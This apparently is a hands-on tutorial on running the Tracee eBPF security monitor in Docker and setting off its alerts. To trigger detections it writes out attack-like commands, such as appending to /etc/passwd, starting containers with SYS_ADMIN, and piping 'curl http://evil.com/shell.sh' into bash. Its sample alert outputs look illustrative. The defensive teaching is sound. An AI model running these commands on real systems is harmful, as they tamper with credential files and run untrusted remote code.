# 🧪 **Tracee Hands-On Lab (Docker Version)**

This lab teaches you:

- ✔ How to run Tracee
- ✔ How to trigger detections (reverse shell, file tampering, privilege escalation)
- ✔ How to analyze alerts
- ✔ How to use filters
- ✔ How to output alerts to a file

No Kubernetes required.

---

## 📌 **Prerequisites**

- ✔ Linux host (Ubuntu recommended) (Not WSL)
- ✔ Docker installed
- ✔ Kernel must support eBPF (most modern kernels do)

Verify:

```bash
uname -r
sudo ls /sys/fs/bpf || echo "bpf missing"
```

---

## 1️⃣ **Run Tracee in Docker (basic mode)**

Simply run:

```bash
sudo docker run --rm -it \
  --name tracee \
  --privileged --pid=host \
  -v /lib/modules:/lib/modules \
  -v /usr/src:/usr/src \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:latest \
  --output json:/tmp/tracee/tracee.json
```

This:

- loads eBPF programs
- starts monitoring
- prints alerts to **your terminal stdout**

💡 **Leave this window open.**

Tracee will display:

```ini
Starting Tracee...
Listening for events...
```

---

## 2️⃣ **Open a second terminal** (for attacks)

We will run malicious-like commands to generate alerts.

---

### 🔹 **Trigger File Modification Alert**

Tracee detects changes in sensitive files.

Run:

```bash
docker run -it --rm -v /etc:/mnt/etc ubuntu bash
```

Inside:

```bash
echo "hack" >> /mnt/etc/passwd
```

Tracee output:

```ini
Suspicious file modification detected
file=/etc/passwd
rule=file_mod
severity=medium
```

Boom. Your first real Tracee alert ✔

---

### 🔹 **Trigger Exec into Container Detection**

Run:

```bash
docker exec -it tracee bash
```

Tracee will print something like:

```ini
Container exec detected
pid=4234 image=aquasec/tracee
```

---

### 🔹 **Trigger Unauthorized Capability Escalation**

Try starting a privileged container:

```bash
docker run --rm -it --privileged ubuntu bash
```

Or give a dangerous capability:

```bash
docker run --rm -it --cap-add SYS_ADMIN ubuntu bash
```

Tracee:

```ini
Alert: suspicious_capability
container started with dangerous capability: SYS_ADMIN
```

---

### 🔹 **Use Filters (Reduce Noise)**

Only show events for a specific container name:

```bash
docker run --rm \
  --privileged \
  aquasec/tracee:latest \
  --filter container=new
```

Only show “high severity” alerts:

```bash
--filter "container=new" --filter "event.severity=high"
```

---

## 📌 **Output to File (For Analysis)**

```bash
docker run --rm \
  --privileged \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:latest \
  --output json --output-file /tmp/tracee/logs.json
```

Alerts will appear in:

```ini
/tmp/tracee/logs.json
```

---

## 📌 **List Available Rules**

```bash
docker run --rm \
  aquasec/tracee:latest \
  --list --rules
```

Example output:

```ini
reverse_shell
ssh_access
file_integrity
capabilities_escalation
docker_abuse
...
```

---

## 🔥 Full Attack Simulation Example

Run Tracee:

```bash
docker run --rm --privileged aquasec/tracee:latest
```

In another terminal:

```bash
docker run -it --rm ubuntu bash
apt update && apt install -y curl
curl http://evil.com/shell.sh | bash
```

Tracee will detect:

- suspicious outbound connection
- script execution from pipe
- unknown binary execution

---

## ✅ Summary

| Attack                       | Tracee Detects          |
| ---------------------------- | ----------------------- |
| Reverse shell                | ✔ reverse_shell         |
| Editing /etc/passwd          | ✔ file_mod              |
| Privileged containers        | ✔ capability escalation |
| Exec into containers         | ✔ container_exec        |
| Abnormal file reads          | ✔ sensitive_file_read   |
| Kernel exploitation attempts | ✔ syscall anomalies     |

---
